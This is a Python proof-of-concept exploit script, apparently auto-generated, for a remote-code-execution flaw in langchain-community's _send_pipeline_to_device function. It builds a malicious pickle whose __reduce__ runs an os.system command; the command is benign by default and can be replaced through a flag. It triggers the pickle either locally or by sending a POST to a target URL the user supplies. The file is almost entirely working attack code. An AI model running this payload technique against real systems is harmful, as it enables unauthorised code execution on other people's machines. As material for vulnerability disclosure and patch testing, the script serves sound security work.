#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-023
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only.

Vulnerability: The function _send_pipeline_to_device in self_hosted.py
deserializes user-controlled input using pickle.load() without any
validation. An attacker can provide a path to a malicious pickle file
(or control the file content) to achieve arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle payload that executes a benign command
   (touch /tmp/poc_success.txt)
2. Writing the payload to a temporary file
3. Calling the vulnerable function with the path to the malicious file
4. Verifying the command was executed

Usage:
    python3 poc.py [--target-url URL] [--target-path PATH]

    If --target-path is provided, the PoC will attempt to write the
    malicious pickle file to that path on the target system (requires
    file write access). Otherwise, it demonstrates the vulnerability
    locally by calling the function directly.
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
import requests
from typing import Optional

# Benign payload: create a marker file to prove code execution
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command
    when deserialized.

    This uses the standard __reduce__ method to execute arbitrary code
    during pickle.load().
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))

    return pickle.dumps(MaliciousPayload())


def write_pickle_file(payload: bytes, filepath: str) -> None:
    """Write pickle payload to a file."""
    with open(filepath, "wb") as f:
        f.write(payload)
    print(f"[+] Malicious pickle file written to: {filepath}")


def exploit_local(pickle_path: str) -> None:
    """
    Demonstrate the vulnerability by calling the vulnerable function
    directly with the path to the malicious pickle file.

    This simulates what would happen if an attacker could control the
    'pipeline' parameter passed to _send_pipeline_to_device.
    """
    # Import the vulnerable function
    sys.path.insert(0, "/tmp/langchain-community-only")
    from langchain_community.llms.self_hosted import _send_pipeline_to_device

    print(f"[*] Calling _send_pipeline_to_device with pipeline='{pickle_path}'")
    print("[*] This will deserialize the malicious pickle and execute the payload...")

    try:
        # The function expects a device parameter as well, but the
        # pickle deserialization happens before any device validation
        result = _send_pipeline_to_device(pickle_path, device=-1)
        print(f"[+] Function returned: {result}")
    except Exception as e:
        # The function may raise an exception after code execution
        # (e.g., if the deserialized object doesn't have expected attributes)
        print(f"[!] Exception after deserialization (expected): {e}")


def exploit_remote(target_url: str, pickle_path: str) -> None:
    """
    Attempt to exploit the vulnerability remotely by sending the
    malicious pickle file path to a vulnerable endpoint.

    This assumes the target has an endpoint that passes user input
    to _send_pipeline_to_device, as described in the system wrapper.
    """
    print(f"[*] Attempting remote exploit against: {target_url}")
    print(f"[*] Sending malicious pickle path: {pickle_path}")

    try:
        response = requests.post(
            target_url,
            json={"pipeline": pickle_path},
            timeout=10
        )
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection failed - target may not be running")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Error during remote exploit: {e}")


def verify_exploit() -> bool:
    """Check if the benign payload was executed successfully."""
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS: Marker file '{marker_file}' exists!")
        print("[+] Code execution confirmed!")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Marker file not found - exploit may have failed")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community-only _send_pipeline_to_device"
    )
    parser.add_argument(
        "--target-url",
        help="Target URL for remote exploit (e.g., http://target:8080/api/v1/trigger)"
    )
    parser.add_argument(
        "--target-path",
        default="/tmp/malicious_pipeline.pkl",
        help="Path to write malicious pickle file on target (default: /tmp/malicious_pipeline.pkl)"
    )
    parser.add_argument(
        "--command",
        default=BENIGN_PAYLOAD,
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()

    print("[*] LangChain Community RCE PoC")
    print("[*] ===========================")
    print(f"[*] Payload command: {args.command}")

    # Step 1: Create the malicious pickle payload
    print("[*] Creating malicious pickle payload...")
    payload = create_malicious_pickle(args.command)
    print(f"[+] Payload size: {len(payload)} bytes")

    # Step 2: Write the payload to a file
    write_pickle_file(payload, args.target_path)

    # Step 3: Execute the exploit
    if args.target_url:
        # Remote exploit attempt
        exploit_remote(args.target_url, args.target_path)
    else:
        # Local exploit demonstration
        exploit_local(args.target_path)

    # Step 4: Verify the exploit
    print("\n[*] Verifying exploit...")
    verify_exploit()

    # Clean up the malicious pickle file
    if os.path.exists(args.target_path):
        os.remove(args.target_path)
        print(f"[*] Cleaned up malicious pickle file: {args.target_path}")


if __name__ == "__main__":
    main()
